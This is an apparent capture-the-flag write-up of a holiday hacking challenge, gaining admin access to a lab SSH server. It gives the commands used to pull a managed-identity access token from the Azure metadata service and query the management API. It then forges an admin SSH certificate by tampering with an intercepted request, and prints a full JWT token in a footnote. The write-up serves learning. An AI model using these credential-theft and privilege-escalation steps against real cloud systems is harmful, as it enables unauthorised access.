# Certificate SSHenanigans

### Tools/Skills 

Certificates, SSH, Azure Instance Metadata Service, Python, Burp Suite, Source Code

---

## SYNOPSIS

I needed to get access to an admin account to determine what kind of cookies were on Alabaster's to-do list.&#x20;

By using a certificate generator website, I created a certificate to login as a user ("monitor") with an "Elf" Principal. I then ssh'ed into the system as "monitor". From there, I found information that I could use to access the certificate website's source code. By accessing Azure Instance Metadata Service, I found the subscription ID, resource group, and access token. With that information, I accessed the source code of the website. The source code revealed that I could specify the principal when I created a certificate. Having already located that I needed a principal of "admin", I intercepted the certificate traffic using burpsuite, specified the principal as admin, then created an admin certificate. I then logged in and found out that on Alabaster's to-do list were gingerbread cookies.

## SOLUTION

1. CREATE PUBLIC KEY & PRIVATE KEY PAIR
   * [x] <mark style="background-color:red;">`ssh-keygen -C 'monitor' -f monitor_ssh_key`</mark>
   * [x] Copied monitor\_ssh\_key.pub into [website form](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl)
   * [x] Copied result (from “rsa-” to the ending of that quotation block) into monitor\_ssh\_key-cert.pub
2.  SSH INTO MONITOR

    <mark style="background-color:red;">`ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i monitor_ssh_key`</mark>
3. PRINCIPALS
   * [x] Change directories to the /etc/ssh/auth\_principals
     * <mark style="background-color:green;">Principal for the Monitor Account: Elf</mark> (this must be the default)
     * <mark style="background-color:green;">Principal for the Alabaster Account: Admin</mark>
4.  SUBSCRIPTION ID & RESOURCE GROUP

    <mark style="background-color:red;">`curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2022-03-01" | jq`</mark>

    <mark style="background-color:green;">SUBSCRIPTION ID:</mark> 2b0942f3-9bca-484b-a508-abdae2db5e64

    <mark style="background-color:green;">RESOURCEGROUP:</mark> NORTHPOLE-RG1
5.  ACCESS TOKEN

    <mark style="background-color:red;">`curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`</mark>

    * [Access Token](#user-content-fn-1)[^1]: [Resource 1](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux) [Resource 2](https://chat.openai.com/share/80e597bb-eedb-46a7-b733-e440be1d82dd)&#x20;
6.  NAME OF APP

    <mark style="background-color:green;">Domain of the website:</mark> https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
7.  REPOSITORY

    <mark style="background-color:red;">`curl -X GET \`</mark>

    <mark style="background-color:red;">`-H "Authorization: Bearer [access token] " \ https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01`</mark>&#x20;

    * REPOSITORY: [https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa](https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa)
8.  In the Github repo, it shows that the code is willing to take an input for both the public key and the principal. If the principal is not included, it will go to the default (elf). I looked at the way the response would like like, which gave me an indication as to the format it wanted the http request in: {“ssh\_cert”: string, “principal”: string}. I also looked at the sanitation that was happening to get a feel for the format.

    <div align="left">

    <figure><img src="https://lh7-us.googleusercontent.com/wuqEVG3Lpye07bpP88o3wdEgC8EpijZTFMhBzHigCiBoJP5u9QzopKAfoaL893xqjdGLIInEAr3LUeaG3hFKPJhmgWO4MqnaUFUZAFg5gZT7-f7iRj3gWbEFRE8TR6Vxf07OEZbFPf-rGnVZ9qQZNck" alt="" width="375"><figcaption></figcaption></figure>

    </div>

    <div align="left">

    <figure><img src="https://lh7-us.googleusercontent.com/rkAV4MTZgRfidcNf4751mDUIM0CLRqoobRNAmA9OceeoUgWVyFIMOQImzQ3gohePeF-IXO-L8oSCqHrXj0xXwH8KKAQrP-1qrWdTz6_pOhaR7-yY2FHTcd2QKW4JiDZ0YSMxzbRuyQIPvuo651sFqGc" alt="" width="375"><figcaption></figcaption></figure>

    </div>

    <div align="left">

    <figure><img src="https://lh7-us.googleusercontent.com/Wh3R2qfRGqmaUMh2Uk4hcaYLGPA5Fb__o4Zk7Ro0Sxd0G6i7SIRmK7jfdm61b4Zb7rKqdkrmeTIPy_bzEMlZP4AhX2ZREDnsKa02IB8MawMSGI8cqP10-bS7m5lZ6vJ68rNBu4w3n6Btbhl9ls48-BU" alt="" width="563"><figcaption></figcaption></figure>

    </div>
9.  Using burpsuite, I intercepted the message, added the principal as “admin”, then copied and pasted the certificate into my certificate file for alabaster.

    <figure><img src="https://lh7-us.googleusercontent.com/TpsVD7j0-POonCNQqBl1aF9Q_r7up_2bIiZMORZpeh2ZOtStIOZbiz4yE6xL4CRry_aGLjvx8vNTKNBWAkLE90PkXM8e3VZebA1TpJ7Wff01tAvggWP-pJ4r_BTA60O40Y3gNO_8xZvuQUGfEpHrch4" alt=""><figcaption></figcaption></figure>
10. I logged in as alabaster (whose principal is “admin”) and opened the todo list file.



    <figure><img src="https://lh7-us.googleusercontent.com/yMrsL8RZUQWw1TRv3ySZZCL_5QVAy0nGqInNQ4UPFgyVP-q6w5cSOpIxr1ziqMYSCnK8jugrm0lp6GVFN35ZOTFmwcg0svSFfYcZXBQGGsdHdoq6UrnGv8al9MXoFViWgKwjOl_LBRACAdTdCt-90ZQ" alt=""><figcaption></figcaption></figure>
11. The answer is: Gingerbread

## PROCESS

This was a two-day process. It was circular, tangential, dimensional-hopping at times. It was practically never linear.

### Tools I used:

1. Provided Video
2. Discord
   * Reading through the different clues and recommended websites proved invaluable.&#x20;
3. **ChatGPT**
   *   [Chat 1](https://chat.openai.com/share/7756d662-0770-4147-8e3c-895a073982e1)

       Example Prompt:

       I have a public and private key pair generated on my computer. An ssh certificate was created by someone else. All I have is:&#x20;

       {"ssh\_cert": "ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJzI1MjUxODgwNjI1NDQxMTg2NDE0ODU5NTM2MzE0NzYxODY2NDU2NQAAACChnwy68XO5RNMeGhmsaVPuCMxT1wEg0Z1EsnnpOlyFXwAAAAAAAAABAAAAAQAAACRlMGExNmU5OS1lNThlLTRlMzAtYTUyZS0yNDU1ODE3NGY2YjUAAAAHAAAAA2VsZgAAAABllZ6tAAAAAGW6idkAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEAllLS7ouA+8Mh6fUq6hkj8ot2k3Wrkfkiu4x7/DRqPwr05AQparr7QQjc6mpClc7DAtZD414nmpB4BjTpBnt8A ",

       "principal": "elf"

       }

       How do I get the certificate on my computer?
   *   [Chat 2](https://chat.openai.com/share/86292fa2-a296-4da9-846a-defdf13538ba)

       Prompt:

       Can I add a principal to a signed certificate?
   * [Chat 3](https://chat.openai.com/share/3fa14a09-a551-4014-b5eb-2bf7332f00a7)
   * [Chat 4](https://chat.openai.com/share/80e597bb-eedb-46a7-b733-e440be1d82dd)
   * [Chat 5](https://chat.openai.com/share/0db91dce-e4f9-4507-9e84-cc7019309d74)
   * [Chat 6](https://chat.openai.com/share/8153423e-fb2b-4e19-86c7-6a19e62e0a4e)
   * [Chat 7](https://chat.openai.com/share/2bbdf7a6-49ac-4211-af83-c9fe360f043b)
   * [Chat 8](https://chat.openai.com/share/7ad4a9b7-f51c-475a-80a0-578a99b2ba65)
4.  [**Bard**](https://g.co/bard/share/172f13dc94d0)

    Example Prompt:

    How do I include the principal field in the JSON data of the HTTP&#x20;

    request body?

[^1]: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDQzODIwMTMsIm5iZiI6MTcwNDM4MjAxMywiZXhwIjoxNzA0NDY4NzEzLCJhaW8iOiJFMlZnWU5EL1BsRXZjZlBTbzU3RmgzTlZzNnVTQVE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJWR2V1b2hoWkUwV21pNjEza2VXdkJ3IiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.PYB\_XxMso-ZhSr0TjpHmZAqZoxjPpwOfii\_eMzd1IRfAp0I7XNFQ21Sqid23SsGcZumO92qPKGLHi-7zOTa88PiEiARRp3U8Vkd9QI5bqq72yhV9wcyBGf9DdGrUYrekZWq3pR8-y-y7cFPkHKpJtPQ1cWZ4DCTmyFNQYPZ2McM-8o2LuJXFw2GsjohEjhnG5TOteLLtg6FOIh9kiIl8YkG1AsSpnPb6yK29gBDB-ns0FjpTOuXPvsWjKv50ljfbI6c9\_IZgi3q25oBrFH3bcDCkZmKALpP\_ft8gsli7JtJAwhBPHiPQpo6YPmRhquZDwobXNBOxg68drpMufaETAw
